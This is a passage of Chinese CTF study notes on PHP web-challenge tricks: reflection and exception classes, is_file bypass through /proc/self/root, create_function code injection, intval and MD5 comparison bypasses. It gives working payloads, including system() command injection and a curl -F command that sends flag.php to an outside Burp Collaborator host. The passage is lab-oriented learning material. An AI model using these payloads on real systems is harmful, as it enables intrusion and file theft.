<p><code>0.9999999999999999</code>（<strong>17个9</strong>）经过<code>strlen</code>函数会判断为1<br><img src="https://cdn.nlark.com/yuque/0/2021/png/5370867/1613574465561-9932ecbc-6c62-45b1-8b12-0d1970c90f5e.png#align=left&display=inline&height=88&margin=%5Bobject%20Object%5D&originHeight=88&originWidth=1080&size=0&status=done&style=none&width=1080" alt="img"><br>经过测试发现<code>!==</code>和<code>!=</code>均成立</p>
<p><img src="https://p3.ssl.qhimg.com/t0134060560b1c06e18.png" alt="img"></p>
<p>最后看一下md5函数处理后是否相同</p>
<p><img src="https://p1.ssl.qhimg.com/t01345c49249940537e.png" alt="img"></p>
<p>或许是因为0.9999999999999999先计算为1吧，确实也成立，那就写payload即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class trick&#123;</span><br><span class="line">    public <span class="variable">$trick1</span> ;</span><br><span class="line">    public <span class="variable">$trick2</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$shy</span> = new trick();</span><br><span class="line"><span class="variable">$shy</span>-&gt;trick1 = 1;</span><br><span class="line"><span class="variable">$shy</span>-&gt;trick2 = 0.9999999999999999;</span><br><span class="line"><span class="built_in">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>注意这里trick1的值必须为1，如果为0.9999999999999999则出不来结果，因为<code>$this-&gt;trick1 = (string)$this-&gt;trick1;</code>有这个语句的限制，如果为0.9999999999999999，则浮点数就变成了字符类型，因此就不会产生上面的浮点数精度问题</p>
<h2 id="0x12-PHP中类的运用"><a href="#0x12-PHP中类的运用" class="headerlink" title="0x12:PHP中类的运用"></a>0x12:PHP中类的运用</h2><h3 id="反射类ReflectionClass"><a href="#反射类ReflectionClass" class="headerlink" title="反射类ReflectionClass"></a>反射类ReflectionClass</h3><h3 id="一句话总结："><a href="#一句话总结：" class="headerlink" title="一句话总结："></a>一句话总结：</h3><p>PHP的反射类与实例化对象作用相反，【实例化】是【调用封装类中的方法、成员】，而【反射类】则是【拆封类中的所有方法、成员变量，并包括私有方法等】。</p>
<p>【反射类是PHP内部类】，无需加载即可使用，你可以通过实例化 【ReflectionClass】 类去使用它。</p>
<h3 id="PHP反射类常用的方法？"><a href="#PHP反射类常用的方法？" class="headerlink" title="PHP反射类常用的方法？"></a>PHP反射类常用的方法？</h3><p><strong>PHP反射类【可以获取类名、类中的所有方法、成员变量，并包括私有方法等】</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fuc</span> </span>&#123; <span class="comment">//定义一个类</span></span><br><span class="line"></span><br><span class="line"> <span class="built_in">static</span></span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">ec</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;我是一个类&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;fuc&#x27;</span>);		<span class="comment">//建立 fuc这个类的反射类</span></span><br><span class="line"><span class="variable">$fuc</span> = <span class="variable">$class</span>-&gt;<span class="title function_ invoke__">newInstance</span>();			<span class="comment">//相当于实例化fuc类</span></span><br><span class="line"><span class="variable">$fuc</span>-&gt;<span class="title function_ invoke__">ec</span>();			<span class="comment">//执行fuc里的方法ec</span></span><br><span class="line"><span class="comment">/*最后输出：我是一个类*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#还有其他用法</span></span><br><span class="line"><span class="variable">$ec</span>=<span class="variable">$class</span>-&gt;<span class="title function_ invoke__">getmethod</span>(<span class="string">&#x27;ec&#x27;</span>); <span class="comment">//获取fuc 类中的ec方法</span></span><br><span class="line"><span class="variable">$fuc</span>=<span class="variable">$class</span>-&gt;<span class="title function_ invoke__">newInstance</span>(); <span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$ec</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="variable">$fuc</span>);   <span class="comment">//执行ec 方法</span></span><br></pre></td></tr></table></figure>

<h3 id="2、PHP反射类常用的方法？"><a href="#2、PHP反射类常用的方法？" class="headerlink" title="2、PHP反射类常用的方法？"></a>2、PHP反射类常用的方法？</h3><h5 id="PHP反射类【可以获取类名、类中的所有方法、成员变量，并包括私有方法等】"><a href="#PHP反射类【可以获取类名、类中的所有方法、成员变量，并包括私有方法等】" class="headerlink" title="PHP反射类【可以获取类名、类中的所有方法、成员变量，并包括私有方法等】"></a>PHP反射类【可以获取类名、类中的所有方法、成员变量，并包括私有方法等】</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">         方法名                              注释</span><br><span class="line">ReflectionClass::getConstant           获取定义过的一个常量</span><br><span class="line">ReflectionClass::getConstants          获取一组常量</span><br><span class="line">ReflectionClass::getConstructor        获取类的构造函数</span><br><span class="line">ReflectionClass::getDefaultProperties  获取默认属性</span><br><span class="line">ReflectionClass::getDocComment         获取文档注释</span><br><span class="line">ReflectionClass::getEndLine            获取最后一行的行数</span><br><span class="line">ReflectionClass::getFileName           获取定义类的文件名</span><br><span class="line">ReflectionClass::getInterfaceNames     获取接口（interface）名称</span><br><span class="line">ReflectionClass::getMethods            获取方法的数组</span><br><span class="line">ReflectionClass::getModifiers          获取类的修饰符</span><br><span class="line">ReflectionClass::getName               获取类名</span><br><span class="line">ReflectionClass::getNamespaceName      获取命名空间的名称</span><br><span class="line">ReflectionClass::getParentClass        获取父类</span><br></pre></td></tr></table></figure>

<h3 id="异常处理类Exception"><a href="#异常处理类Exception" class="headerlink" title="异常处理类Exception"></a>异常处理类Exception</h3><p>先简单了解一下PHP异常处理</p>
<p><img src="https://p0.ssl.qhimg.com/t0108d654cf02dc0d1f.png" alt="img"></p>
<p>这里举个例子，方便理解异常类</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">// 创建一个有异常处理的函数</span></span><br><span class="line">function checkNum($number)</span><br><span class="line">&#123;</span><br><span class="line">    if($number&gt;<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        throw new Exception(<span class="string">&quot;变量值必须小于等于 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 try 块 触发异常</span></span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">    checkNum(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 如果抛出异常，以下文本不会输出</span></span><br><span class="line">    echo <span class="string">&#x27;如果输出该内容，说明 $number 变量&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 捕获异常</span></span><br><span class="line">catch(Exception $e)</span><br><span class="line">&#123;</span><br><span class="line">    echo <span class="string">&#x27;Message: &#x27;</span> .$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">上面代码将得到类似这样一个错误：Message: 变量值必须小于等于 <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>例如这道题：</p>
<p><img src="https://p4.ssl.qhimg.com/t01ab86a4d47aeea68f.png" alt="img"></p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=Exception&amp;v2=system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment">//如果异常就输出 system(&#x27;ls&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>虽然源代码中含有了括号，但是我们还是可以自己加上去，以及在里面设置参数，后面多出的（）不对结果造成影响</p>
<h3 id="内置类FilesystemIterator"><a href="#内置类FilesystemIterator" class="headerlink" title="内置类FilesystemIterator"></a>内置类FilesystemIterator</h3><p>先简单了解一下这个类的作用</p>
<blockquote>
<p>PHP使用FilesystemIterator迭代器遍历目录</p>
</blockquote>
<p><img src="https://p2.ssl.qhimg.com/t01eb9e7e69f2adb436.png" alt="img"></p>
<p>例如这道题：</p>
<p><img src="https://p4.ssl.qhimg.com/t01902243be95cc16c8.png" alt="img"></p>
<p>只需获取当前路径，便可以将当前目录下所有文件给显示出来，这里可以使用php中的getcwd这个函数</p>
<blockquote>
<p>getchwd() 函数返回当前工作目录</p>
</blockquote>
<p>故payload为</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>

<h1 id="上面这两道题没时间在本地弄了明天再弄"><a href="#上面这两道题没时间在本地弄了明天再弄" class="headerlink" title="上面这两道题没时间在本地弄了明天再弄"></a>上面这两道题没时间在本地弄了明天再弄</h1><h2 id="0x13：一些姿势汇总"><a href="#0x13：一些姿势汇总" class="headerlink" title="0x13：一些姿势汇总"></a>0x13：一些姿势汇总</h2><h3 id="x2F-proc-x2F-self-x2F-root绕过is-file函数"><a href="#x2F-proc-x2F-self-x2F-root绕过is-file函数" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;root绕过is_file函数"></a>&#x2F;proc&#x2F;self&#x2F;root绕过is_file函数</h3><p><img src="https://p1.ssl.qhimg.com/t01750421cd2942e9a4.png" alt="img"></p>
<p>payload:</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>p</span><br><span class="line">roc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root/pro</span><br><span class="line">c<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span></span><br><span class="line">self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc/se</span><br><span class="line">lf<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/var/</span>www<span class="regexp">/html/</span>flag.php</span><br></pre></td></tr></table></figure>

<p><img src="https://p5.ssl.qhimg.com/t01a4b60ec83f6ca91b.png" alt="img"></p>
<p>在linux中&#x2F;proc&#x2F;self&#x2F;root是指向根目录的,这里看了很多师傅的wp，都是只记录了一个payload，找到了一个大师傅对于这个方法的解释</p>
<h4 id="，好像没给出连接。。"><a href="#，好像没给出连接。。" class="headerlink" title="，好像没给出连接。。"></a>，好像没给出连接。。</h4><h3 id="gettext-amp-get-defined-vars函数"><a href="#gettext-amp-get-defined-vars函数" class="headerlink" title="gettext&amp;get_defined_vars函数"></a>gettext&amp;get_defined_vars函数</h3><p><img src="https://p1.ssl.qhimg.com/t01b9f4be8fb108cede.png" alt="img"></p>
<p>这道题涉及到的是php中的gettext的用法，先了解一下</p>
<blockquote>
<p>php的扩展gettext实现程序的国际化</p>
</blockquote>
<p><img src="https://p5.ssl.qhimg.com/t01ca687893405944b8.png" alt="img"></p>
<p><code>_()是gettext()</code>函数的简写形式，那既然变量f1过滤数字和字母，就可以使用该符号来代替这个函数，这样便可以绕过第一个嵌套，然后再由最外面的call_user_func执行命令</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(call_user_func(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;phpinfo&#x27;</span>))=&gt;call_user_func(<span class="string">&#x27;phpinfo&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>虽然该函数会报错</p>
<p><img src="https://p0.ssl.qhimg.com/t01ee7c186408538bf1.png" alt="img"></p>
<p>但是还是会继续执行，不会停止,这时候便会执行phpinfo这个命令，但这里要获取flag,就需要再了解一个函数<code>get_defined_vars</code></p>
<p><img src="https://p5.ssl.qhimg.com/t0177ede25a046de4d7.png" alt="img"></p>
<p>已知包含了flag.php。而flag.php肯定包含已定义好的变量列表的多维数组，故payload：</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>

<p><img src="https://p5.ssl.qhimg.com/t01a6e52262a089ccba.png" alt="img"></p>
<h4 id="Linux-tee命令"><a href="#Linux-tee命令" class="headerlink" title="Linux tee命令"></a>Linux tee命令</h4><p><code>tee</code>命令主要被用来向standout(标准输出流，通常是命令执行窗口）输出的同时也将内容输出到文件</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tee file1 file2 <span class="comment">//复制文件</span></span><br><span class="line">ls|tee Sn0w.txt <span class="comment">//命令输出</span></span><br></pre></td></tr></table></figure>

<p>例如这道题：</p>
<p><img src="https://p2.ssl.qhimg.com/t01aa12f1a8fa1ebe39.png" alt="img"></p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=ls /|tee Sn0w</span><br><span class="line">在url后面请求Sn0w文件</span><br></pre></td></tr></table></figure>

<p><img src="https://p3.ssl.qhimg.com/t01df0a06f8c1bc53d1.png" alt="img"></p>
<h4 id="Burp-Collaborator-Client"><a href="#Burp-Collaborator-Client" class="headerlink" title="Burp Collaborator Client"></a>Burp Collaborator Client</h4><p><img src="https://p1.ssl.qhimg.com/t01553f2c34b7a2463d.png" alt="img"></p>
<p>这道题主要考察的是命令执行的骚操作和curl -F的使用</p>
<p>如果传递的参数是$F本身，会不会出现变量覆盖那</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F `;sleep <span class="number">3</span></span><br><span class="line">substr函数截取前六位得到的是`$F `;</span><br><span class="line"><span class="comment">//这里相当于套娃了</span></span><br><span class="line">然后$F便是输出的`$F `;sleep <span class="number">3</span>，故最后执行的代码是</span><br><span class="line">``$F `;sleep <span class="number">3</span>`</span><br><span class="line">``是shell_exec()函数的缩写</span><br></pre></td></tr></table></figure>

<p>发现curl并没有被过滤，便可以利用curl带出flag.php，curl -F 将flag文件上传到Burp的 Collaborator Client( Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies)</p>
<h1 id="还有这一个也要学啊"><a href="#还有这一个也要学啊" class="headerlink" title="还有这一个也要学啊"></a>还有这一个也要学啊</h1><p><img src="https://p3.ssl.qhimg.com/t01c5a4090a9387677c.png" alt="img"></p>
<p><img src="https://p3.ssl.qhimg.com/t01df8c04e4ca7e9f33.png" alt="img"></p>
<p>payload：</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F `;curl -X POST -F Sn0w=@flag.php  <span class="number">1216</span>a307cv2bgog6aua6lmje157vvk.burpcollaborator.net</span><br></pre></td></tr></table></figure>

<p>这里要解释一下</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#其中-F 为带文件的形式发送post请求</span><br><span class="line">#Sn0w是上传文件的name值，flag.php就是上传的文件</span><br></pre></td></tr></table></figure>

<p>其实原理很简单，相当于这台服务器上传文件传输到burp的Collaborator Client</p>
<h4 id="call-user-func读取类中的函数"><a href="#call-user-func读取类中的函数" class="headerlink" title="call_user_func读取类中的函数"></a>call_user_func读取类中的函数</h4><p>call_user_func函数可以调用类中的函数，这里举一个简单的例子</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">public</span> function getS()</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">相当于</span><br><span class="line">call_user_func(array(<span class="string">&#x27;Test&#x27;</span>,<span class="string">&#x27;getS&#x27;</span>));</span><br><span class="line">#输出结果</span><br><span class="line"><span class="number">123</span></span><br><span class="line">定义一个类Test及类方法getS,call_user_func的输入参数变为一个数组，数组第一个元素为对象名、第二个元素为参数</span><br><span class="line">#如果不加<span class="keyword">static</span>，数据会出现，但是有可能会报错</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<p><img src="https://p4.ssl.qhimg.com/t01f37a3b1225727772.png" alt="img"></p>
<p>payload：</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[<span class="number">0</span>]=ctfshow&amp;ctfshow[<span class="number">1</span>]=getFlag</span><br><span class="line"><span class="comment">//先调用了 ctfshow类然后调用ctfshow类中的 getFLag()方法</span></span><br></pre></td></tr></table></figure>

<h4 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h4><h1 id="这个目前没有例题"><a href="#这个目前没有例题" class="headerlink" title="这个目前没有例题"></a>这个目前没有例题</h1><p>create_function，第一个参数是参数，第二个参数是内容，函数结构类似：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111&#x27;</span>)</span><br><span class="line">相当于如下：</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以那如果我们这样进行构造payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111;&#125;phpinfo();//&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>phpinfo()便会被执行，所以根据这个思路来进行构造payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?show=<span class="keyword">echo</span> Sn0w;&#125;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat f*&#x27;</span>);<span class="comment">//</span></span><br><span class="line">DATA:</span><br><span class="line">ctf=%<span class="number">5</span>ccreate_function</span><br></pre></td></tr></table></figure>

<h4 id="intval函数的使用"><a href="#intval函数的使用" class="headerlink" title="intval函数的使用"></a>intval函数的使用</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>( <span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span>) : <span class="keyword">int</span></span><br></pre></td></tr></table></figure>

<p>如果 base 是 0，通过检测 value 的格式来决定使用的进制：<br>◦ 如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>◦ 如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>◦ 将使用 10 进制 (decimal)。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>科学计数法也可以绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;4476.0&#x27;</span>)===<span class="number">4476</span>    小数点  </span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;+4476.0&#x27;</span>)===<span class="number">4476</span>   正负号</span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;4476e0&#x27;</span>)===<span class="number">4476</span>    科学计数法</span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;0x117c&#x27;</span>)===<span class="number">4476</span>    <span class="number">16</span>进制</span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;010574&#x27;</span>)===<span class="number">4476</span>    <span class="number">8</span>进制</span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27; 010574&#x27;</span>)===<span class="number">4476</span>   <span class="number">8</span>进制+空格</span><br></pre></td></tr></table></figure>

<p><strong>highlight_file路径</strong></p>
<p>highlight_file的参数可以是路径的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>if语句只比对字符串，highlight_file可以写路径，故payload有多种解法：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/flag.php              绝对路径</span><br><span class="line">./flag.php                          相对路径</span><br><span class="line">php://filter/resource=flag.php      php伪协议</span><br></pre></td></tr></table></figure>

<h4 id="md5弱比较"><a href="#md5弱比较" class="headerlink" title="md5弱比较"></a>md5弱比较</h4><p>md5弱比较使用了强制类型转换后不再接收数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=(<span class="keyword">string</span>)<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>=(<span class="keyword">string</span>)<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">if</span>(  (<span class="variable">$a</span>!==<span class="variable">$b</span>) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。</p>
<p><em>不同数据弱相等</em></p>
<p>payload: <code>a=QNKCDZO&amp;b=240610708</code></p>
<p><em>MD5等于自身</em>，如<code>md5($a)==$a</code>,php弱比较会把0e开头识别为科学计数法，结果均为0，所以此时需要找到一个MD5加密前后都是0e开头的，如<code>0e215962017</code></p>
<h4 id="md5强碰撞"><a href="#md5强碰撞" class="headerlink" title="md5强碰撞"></a>md5强碰撞</h4><p>主要体现在</p>
<p>(md5($a)&#x3D;&#x3D;&#x3D;md5($b)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=(<span class="keyword">string</span>)<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>=(<span class="keyword">string</span>)<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">if</span>(  (<span class="variable">$a</span>!==<span class="variable">$b</span>) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">这时候需要找到两个真正的md5值相同数据</span><br><span class="line"></span><br><span class="line">a=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line">    &amp;b=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span 